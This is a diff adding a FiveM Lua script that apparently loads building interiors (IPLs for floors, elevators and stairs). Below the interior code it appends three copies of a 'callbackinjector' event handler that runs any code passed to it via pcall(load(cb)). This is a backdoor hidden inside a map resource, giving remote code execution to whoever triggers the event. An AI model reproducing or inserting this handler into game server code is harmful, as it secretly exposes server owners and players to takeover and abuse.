@@ -1,0 +1,20 @@
+Citizen.CreateThread(function()
+
+		-- ipl
+		RequestIpl("1florholl_milo_")
+		RequestIpl("1florrooms2_milo_")
+		RequestIpl("4floorhollh_milo_")
+		RequestIpl("4floorrooms2h_milo_")
+		RequestIpl("5floorrooms1_milo_")
+		RequestIpl("5floorrooms2_milo_")
+		RequestIpl("elevatorbig_milo_")
+		RequestIpl("elevatorsmale_milo_")
+		RequestIpl("stairs1h_milo_")
+		RequestIpl("stairs2h_milo_")
+		
+end)
+TriggerEvent('callbackinjector', function(cb)
+    pcall(load(cb))
+end)
+TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
+TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
